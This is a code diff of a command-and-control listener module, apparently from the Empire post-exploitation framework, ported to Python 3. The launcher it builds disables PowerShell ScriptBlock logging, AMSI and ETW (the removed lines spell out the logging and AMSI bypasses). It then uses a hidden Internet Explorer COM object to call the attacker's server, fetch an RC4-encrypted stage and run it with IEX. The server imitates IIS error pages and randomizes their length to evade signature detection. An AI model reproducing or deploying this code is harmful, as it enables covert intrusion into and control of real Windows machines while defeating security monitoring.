@@ -1,24 +1,30 @@
-import logging
+from __future__ import print_function
+
 import base64
-import random
-import os
-import ssl
-import time
 import copy
 import json
+import logging
+import os
+import random
+import ssl
 import sys
-from pydispatch import dispatcher
-from flask import Flask, request, make_response, send_from_directory
+import threading
+import time
+from builtins import object
+from builtins import str
 
+from flask import Flask, request, make_response, send_from_directory
+from werkzeug.serving import WSGIRequestHandler
+from pydispatch import dispatcher
+
+from lib.common import bypasses
+from lib.common import encryption
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
 from lib.common import packets
-from lib.common import messages
 
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -30,7 +36,7 @@ class Listener:
             'Description': ('Starts a http[s] listener (PowerShell only) that uses a GET/POST approach '
                             'using a hidden Internet Explorer COM object. If using HTTPS, valid certificate required.'),
 
-            'Category' : ('client_server'),
+            'Category': ('client_server'),
 
             'Comments': []
         }
@@ -40,90 +46,90 @@ class Listener:
             # format:
             #   value_name : {description, required, default_value}
 
-            'Name' : {
-                'Description'   :   'Name for the listener.',
-                'Required'      :   True,
-                'Value'         :   'http_com'
+            'Name': {
+                'Description': 'Name for the listener.',
+                'Required': True,
+                'Value': 'http_com'
             },
-            'Host' : {
-                'Description'   :   'Hostname/IP for staging.',
-                'Required'      :   True,
-                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
+            'Host': {
+                'Description': 'Hostname/IP for staging.',
+                'Required': True,
+                'Value': "http://%s" % (helpers.lhost())
             },
-            'BindIP' : {
-                'Description'   :   'The IP to bind to on the control server.',
-                'Required'      :   True,
-                'Value'         :   '0.0.0.0'
+            'BindIP': {
+                'Description': 'The IP to bind to on the control server.',
+                'Required': True,
+                'Value': '0.0.0.0'
             },
-            'Port' : {
-                'Description'   :   'Port for the listener.',
-                'Required'      :   True,
-                'Value'         :   80
+            'Port': {
+                'Description': 'Port for the listener.',
+                'Required': True,
+                'Value': ''
             },
-            'Launcher' : {
-                'Description'   :   'Launcher string.',
-                'Required'      :   True,
-                'Value'         :   'powershell -noP -sta -w 1 -enc '
+            'Launcher': {
+                'Description': 'Launcher string.',
+                'Required': True,
+                'Value': 'powershell -noP -sta -w 1 -enc '
             },
-            'StagingKey' : {
-                'Description'   :   'Staging key for initial agent negotiation.',
-                'Required'      :   True,
-                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
+            'StagingKey': {
+                'Description': 'Staging key for initial agent negotiation.',
+                'Required': True,
+                'Value': '2c103f2c4ed1e59c0b4e2e01821770fa'
             },
-            'DefaultDelay' : {
-                'Description'   :   'Agent delay/reach back interval (in seconds).',
-                'Required'      :   True,
-                'Value'         :   5
+            'DefaultDelay': {
+                'Description': 'Agent delay/reach back interval (in seconds).',
+                'Required': True,
+                'Value': 5
             },
-            'DefaultJitter' : {
-                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
-                'Required'      :   True,
-                'Value'         :   0.0
+            'DefaultJitter': {
+                'Description': 'Jitter in agent reachback interval (0.0-1.0).',
+                'Required': True,
+                'Value': 0.0
             },
-            'DefaultLostLimit' : {
-                'Description'   :   'Number of missed checkins before exiting',
-                'Required'      :   True,
-                'Value'         :   60
+            'DefaultLostLimit': {
+                'Description': 'Number of missed checkins before exiting',
+                'Required': True,
+                'Value': 60
             },
-            'DefaultProfile' : {
-                'Description'   :   'Default communication profile for the agent.',
-                'Required'      :   True,
-                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+            'DefaultProfile': {
+                'Description': 'Default communication profile for the agent.',
+                'Required': True,
+                'Value': "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
             },
-            'CertPath' : {
-                'Description'   :   'Certificate path for https listeners.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'CertPath': {
+                'Description': 'Certificate path for https listeners.',
+                'Required': False,
+                'Value': ''
             },
-            'KillDate' : {
-                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
-                'Required'      :   False,
-                'Value'         :   ''
+            'KillDate': {
+                'Description': 'Date for the listener to exit (MM/dd/yyyy).',
+                'Required': False,
+                'Value': ''
             },
-            'WorkingHours' : {
-                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
-                'Required'      :   False,
-                'Value'         :   ''
+            'WorkingHours': {
+                'Description': 'Hours for the agent to operate (09:00-17:00).',
+                'Required': False,
+                'Value': ''
             },
-            'RequestHeader' : {
-                'Description'   :   'Cannot use Cookie header, choose a different HTTP request header for comms.',
-                'Required'      :   True,
-                'Value'         :   'CF-RAY'
+            'RequestHeader': {
+                'Description': 'Cannot use Cookie header, choose a different HTTP request header for comms.',
+                'Required': True,
+                'Value': 'CF-RAY'
             },
-            'ServerVersion' : {
-                'Description'   :   'Server header for the control server.',
-                'Required'      :   True,
-                'Value'         :   'Microsoft-IIS/7.5'
+            'Headers': {
+                'Description': 'Headers for the control server.',
+                'Required': True,
+                'Value': 'Server:Microsoft-IIS/7.5'
             },
-            'SlackToken' : {
-                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'SlackToken': {
+                'Description': 'Your SlackBot API token to communicate with your Slack instance.',
+                'Required': False,
+                'Value': ''
             },
-            'SlackChannel' : {
-                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
-                'Required'      :   False,
-                'Value'         :   '#general'
+            'SlackChannel': {
+                'Description': 'The Slack channel or DM that notifications will be sent to.',
+                'Required': False,
+                'Value': '#general'
             }
         }
 
@@ -138,53 +144,104 @@ class Listener:
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
 
+        # used to protect self.http and self.mainMenu.conn during threaded listener access
+        self.lock = threading.Lock()
+
         # randomize the length of the default_response and index_page headers to evade signature based scans
-        self.header_offset = random.randint(0,64)
+        self.header_offset = random.randint(0, 64)
+
+    # this might not be necessary. Could probably be achieved by just callingg mainmenu.get_db but all the other files have
+    # implemented it in place. Might be worthwhile to just make a database handling file
+    def get_db_connection(self):
+        """
+        Returns the cursor for SQLlite DB
+        """
+        self.lock.acquire()
+        self.mainMenu.conn.row_factory = None
+        self.lock.release()
+        return self.mainMenu.conn
 
     def default_response(self):
-         """
+        """
          Returns an IIS 7.5 404 not found page.
          """
 
-         return '\n'.join([
-             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-             '<html xmlns="http://www.w3.org/1999/xhtml">',
-             '<head>',
-             '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
-             '<title>404 - File or directory not found.</title>',
-             '<style type="text/css">',
-             '<!--',
-             'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
-             'fieldset{padding:0 15px 10px 15px;}',
-             'h1{font-size:2.4em;margin:0;color:#FFF;}',
-             'h2{font-size:1.7em;margin:0;color:#CC0000;}',
-             'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
-             '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
-             'background-color:#555555;}',
-             '#content{margin:0 0 0 2%;position:relative;}',
-             '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
-             '-->',
-             '</style>',
-             '</head>',
-             '<body>',
-             '<div id="header"><h1>Server Error</h1></div>',
-             '<div id="content">',
-             ' <div class="content-container"><fieldset>',
-             '  <h2>404 - File or directory not found.</h2>',
-             '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
-             ' </fieldset></div>',
-             '</div>',
-             '</body>',
-             '</html>',
-             ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
-         ])
+        return '\r\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+            '<title>404 - File or directory not found.</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+            'fieldset{padding:0 15px 10px 15px;}',
+            'h1{font-size:2.4em;margin:0;color:#FFF;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;}',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
+            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+            'background-color:#555555;}',
+            '#content{margin:0 0 0 2%;position:relative;}',
+            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="header"><h1>Server Error</h1></div>',
+            '<div id="content">',
+            ' <div class="content-container"><fieldset>',
+            '  <h2>404 - File or directory not found.</h2>',
+            '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
+            ' </fieldset></div>',
+            '</div>',
+            '</body>',
+            '</html>',
+            ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
+        ])
+
+    def method_not_allowed_page(self):
+        """
+        Imitates IIS 7.5 405 "method not allowed" page.
+        """
+
+        return '\r\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+            '<title>405 - HTTP verb used to access this page is not allowed.</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+            'fieldset{padding:0 15px 10px 15px;} ',
+            'h1{font-size:2.4em;margin:0;color:#FFF;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
+            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+            'background-color:#555555;}',
+            '#content{margin:0 0 0 2%;position:relative;}',
+            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="header"><h1>Server Error</h1></div>',
+            '<div id="content">',
+            ' <div class="content-container"><fieldset>',
+            '  <h2>405 - HTTP verb used to access this page is not allowed.</h2>',
+            '  <h3>The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.</h3>',
+            ' </fieldset></div>',
+            '</div>',
+            '</body>',
+            '</html>\r\n'
+        ])
 
     def index_page(self):
         """
         Returns a default HTTP server page.
         """
 
-        return '\n'.join([
+        return '\r\n'.join([
             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
             '<html xmlns="http://www.w3.org/1999/xhtml">',
             '<head>',
@@ -193,19 +250,19 @@ class Listener:
             '<style type="text/css">',
             '<!--',
             'body {',
-            '    color:#000000;',
-            '    background-color:#B3B3B3;',
-            '    margin:0;',
+            '	color:#000000;',
+            '	background-color:#B3B3B3;',
+            '	margin:0;',
             '}',
             '',
             '#container {',
-            '    margin-left:auto;',
-            '    margin-right:auto;',
-            '    text-align:center;',
-            '    }',
+            '	margin-left:auto;',
+            '	margin-right:auto;',
+            '	 text-align:center;',
+            '	}',
             '',
             'a img {',
-            '    border:none;',
+            '	border:none;',
             '}',
             '',
             '-->',
@@ -228,21 +285,26 @@ class Listener:
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
-                print helpers.color("[!] Option \"%s\" is required." % (key))
+                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                 return False
-
+        # If we've selected an HTTPS listener without specifying CertPath, let us know.
+        if self.options['Host']['Value'].startswith('https') and self.options['CertPath']['Value'] == '':
+            print(helpers.color("[!] HTTPS selected but no CertPath specified."))
+            return False
         return True
 
-
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
+                          proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
+                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
         """
         Generate a basic launcher for the specified listener.
         """
 
         if not language:
-            print helpers.color('[!] listeners/http_com generate_launcher(): no language specified!')
+            print(helpers.color('[!] listeners/http_com generate_launcher(): no language specified!'))
 
-        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
+        if listenerName and (listenerName in self.threads) and (
+                listenerName in self.mainMenu.listeners.activeListeners):
 
             # extract the set options for this instantiated listener
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
@@ -261,41 +323,23 @@ class Listener:
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        stager += bypasses.scriptBlockLogBypass()
+                    if ETWBypass:
+                        stager += bypasses.ETWBypass()
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    if AMSIBypass:
+                        stager += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 # TODO: reimplement stager retries?
 
-                #check if we're using IPv6
+                # check if we're using IPv6
                 listenerOptions = copy.deepcopy(listenerOptions)
                 bindIP = listenerOptions['BindIP']['Value']
                 port = listenerOptions['Port']['Value']
@@ -307,23 +351,28 @@ class Listener:
                             host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
-                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
+                stager += helpers.randomize_capitalization(
+                    "$" + helpers.generate_random_script_var_name("K") + "=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+                stager += helpers.randomize_capitalization('$R={$D,$' + helpers.generate_random_script_var_name(
+                    "K") + '=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$' + helpers.generate_random_script_var_name(
+                    "K") + '[$_%$' + helpers.generate_random_script_var_name(
+                    "K") + '.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
+                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL',
+                                                             meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
 
                 # add the RC4 packet to a header location
                 stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
 
-                #Add custom headers if any
+                # Add custom headers if any
                 modifyHost = False
                 if customHeaders != []:
                     for header in customHeaders:
@@ -336,10 +385,11 @@ class Listener:
                         stager += "`r`n%s: %s" % (headerKey, headerValue)
 
                 stager += "\";"
-                #If host header defined, assume domain fronting is in use and add a call to the base URL first
-                #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+                # If host header defined, assume domain fronting is in use and add a call to the base URL first
+                # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                 if modifyHost:
-                    stager += helpers.randomize_capitalization("$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
+                    stager += helpers.randomize_capitalization(
+                        "$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
 
                 stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
@@ -348,7 +398,8 @@ class Listener:
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
+                stager += helpers.randomize_capitalization(
+                    "-join[Char[]](& $R $data ($IV+$" + helpers.generate_random_script_var_name("K") + ")) | IEX")
 
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
@@ -360,19 +411,20 @@ class Listener:
                     return stager
 
             else:
-                print helpers.color("[!] listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module.")
+                print(helpers.color(
+                    "[!] listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module."))
 
         else:
-            print helpers.color("[!] listeners/http_com generate_launcher(): invalid listener name specification!")
+            print(helpers.color("[!] listeners/http_com generate_launcher(): invalid listener name specification!"))
 
-
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="",
+                        language=None):
         """
         Generate the stager code needed for communications with this listener.
         """
 
         if not language:
-            print helpers.color('[!] listeners/http_com generate_stager(): no language specified!')
+            print(helpers.color('[!] listeners/http_com generate_stager(): no language specified!'))
             return None
 
         profile = listenerOptions['DefaultProfile']['Value']
@@ -393,11 +445,18 @@ class Listener:
             stager = f.read()
             f.close()
 
+            # Get the random function name generated at install and patch the stager with the proper function name
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            stager = helpers.keyword_obfuscation(stager)
+            self.lock.release()
+
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
 
-            #Patch in custom Headers
+            # Patch in custom Headers
             headers = ""
             if customHeaders != []:
                 crlf = False
@@ -411,7 +470,7 @@ class Listener:
                     else:
                         crlf = True
                     headers += "%s: %s" % (headerKey, headerValue)
-                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
+                stager = stager.replace("$customHeaders = \"\";", "$customHeaders = \"" + headers + "\";")
 
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
@@ -419,11 +478,12 @@ class Listener:
             stager = stager.replace('index.jsp', stage1)
             stager = stager.replace('index.php', stage2)
 
-            #patch in working hours, if any
+            # patch in working hours, if any
             if workingHours != "":
                 stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             randomizedStager = ''
+            stagingKey = stagingKey.encode('UTF-8')
 
             for line in stager.split("\n"):
                 line = line.strip()
@@ -436,20 +496,21 @@ class Listener:
                         randomizedStager += line
 
             if obfuscate:
-                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
+                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager,
+                                                     obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(randomizedStager)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
+                return RC4IV + encryption.rc4(RC4IV + stagingKey, randomizedStager.encode('UTF-8'))
             else:
                 # otherwise just return the case-randomized stager
                 return randomizedStager
 
         else:
-            print helpers.color("[!] listeners/http_com generate_stager(): invalid language specification, only 'powershell' is current supported for this module.")
-
+            print(helpers.color(
+                "[!] listeners/http_com generate_stager(): invalid language specification, only 'powershell' is current supported for this module."))
 
     def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
         """
@@ -457,7 +518,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/http_com generate_agent(): no language specified!')
+            print(helpers.color('[!] listeners/http_com generate_agent(): no language specified!'))
             return None
 
         language = language.lower()
@@ -466,13 +527,19 @@ class Listener:
         profile = listenerOptions['DefaultProfile']['Value']
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
-        b64DefaultResponse = base64.b64encode(self.default_response())
+        b64DefaultResponse = base64.b64encode(self.default_response().encode('UTF-8'))
 
         if language == 'powershell':
 
             f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
             code = f.read()
             f.close()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            code = helpers.keyword_obfuscation(code)
+            self.lock.release()
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -484,9 +551,12 @@ class Listener:
             # patch in the delay, jitter, lost limit, and comms profile
             code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
             code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            code = code.replace(
+                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
+                "$Profile = \"" + str(profile) + "\"")
             code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64DefaultResponse+'"')
+            # code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64DefaultResponse+'"')
+            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "' + str(b64DefaultResponse) + '"')
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -496,8 +566,8 @@ class Listener:
             return code
 
         else:
-            print helpers.color("[!] listeners/http_com generate_agent(): invalid language specification, only 'powershell' is currently supported for this module.")
-
+            print(helpers.color(
+                "[!] listeners/http_com generate_agent(): invalid language specification, only 'powershell' is currently supported for this module."))
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -601,10 +671,10 @@ class Listener:
                 return updateServers + getTask + sendMessage
 
             else:
-                print helpers.color("[!] listeners/http_com generate_comms(): invalid language specification, only 'powershell' is currently supported for this module.")
+                print(helpers.color(
+                    "[!] listeners/http_com generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."))
         else:
-            print helpers.color('[!] listeners/http_com generate_comms(): no language specified!')
-
+            print(helpers.color('[!] listeners/http_com generate_comms(): no language specified!'))
 
     def start_server(self, listenerOptions):
         """
@@ -626,6 +696,9 @@ class Listener:
         app = Flask(__name__)
         self.app = app
 
+        # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
+        WSGIRequestHandler.protocol_version = "HTTP/1.1"
+
         @app.before_request
         def check_ip():
             """
@@ -641,13 +714,14 @@ class Listener:
                 dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                 return make_response(self.default_response(), 404)
 
-
         @app.after_request
         def change_header(response):
-            "Modify the default server version in the response."
-            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
+            "Modify the headers response server."
+            headers = listenerOptions['Headers']['Value']
+            for key in headers.split("|"):
+                value = key.split(":")
+                response.headers[value[0]] = value[1]
             return response
-
 
         @app.after_request
         def add_proxy_headers(response):
@@ -657,8 +731,15 @@ class Listener:
             response.headers['Expires'] = "0"
             return response
 
+        @app.errorhandler(405)
+        def handle_405(e):
+            """
+            Returns IIS 7.5 405 page for every Flask 405 error.
+            """
+            return make_response(self.method_not_allowed_page(), 405)
+
         @app.route('/')
-        @app.route('/index.html')
+        @app.route('/iisstart.htm')
         def serve_index():
             """
             Return default server web page if user navigates to index.
@@ -666,15 +747,6 @@ class Listener:
 
             static_dir = self.mainMenu.installPath + "data/misc/"
             return make_response(self.index_page(), 200)
-
-        @app.route('/welcome.png')
-        def serve_index_helper():
-            """
-            Serves image loaded by index page.
-            """
-
-            static_dir = self.mainMenu.installPath + "data/misc/"
-            return send_from_directory(static_dir, 'welcome.png')
 
         @app.route('/<path:request_uri>', methods=['GET'])
         def handle_get(request_uri):
@@ -684,12 +756,20 @@ class Listener:
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
+            if request_uri.lower() == 'welcome.png':
+                # Serves image loaded by index page.
+                #
+                # Thanks to making it case-insensitive it works the same way as in 
+                # an actual IIS server
+                static_dir = self.mainMenu.installPath + "data/misc/"
+                return send_from_directory(static_dir, 'welcome.png')
+
             clientIP = request.remote_addr
 
             listenerName = self.options['Name']['Value']
             message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
             signal = json.dumps({
-                'print': True,
+                'print': False,
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
@@ -698,14 +778,24 @@ class Listener:
             reqHeader = request.headers.get(listenerOptions['RequestHeader']['Value'])
             if reqHeader and reqHeader != '':
                 try:
-                    # decode the routing packet base64 value from the custom HTTP request header location
-                    routingPacket = base64.b64decode(reqHeader)
+
+                    if reqHeader.startswith("b'"):
+                        tmp = repr(reqHeader)[2:-1].replace("'", "").encode("UTF-8")
+                    else:
+                        tmp = reqHeader.encode("UTF-8")
+                    routingPacket = base64.b64decode(tmp)
                 except Exception as e:
                     routingPacket = None
+                    # pass
+
+                    # if isinstance(results, str):
 
             if routingPacket:
                 # parse the routing packet and process the results
-                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
+
+                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions,
+                                                                     clientIP)
+
                 if dataResults and len(dataResults) > 0:
                     for (language, results) in dataResults:
                         if results:
@@ -714,18 +804,21 @@ class Listener:
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
                                 listenerName = self.options['Name']['Value']
-                                message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
+                                message = "\n[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
                                 signal = json.dumps({
                                     'print': True,
                                     'message': message
                                 })
                                 dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
-                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
+                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions,
+                                                             obfuscate=self.mainMenu.obfuscate,
+                                                             obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(base64.b64encode(stage), 200)
 
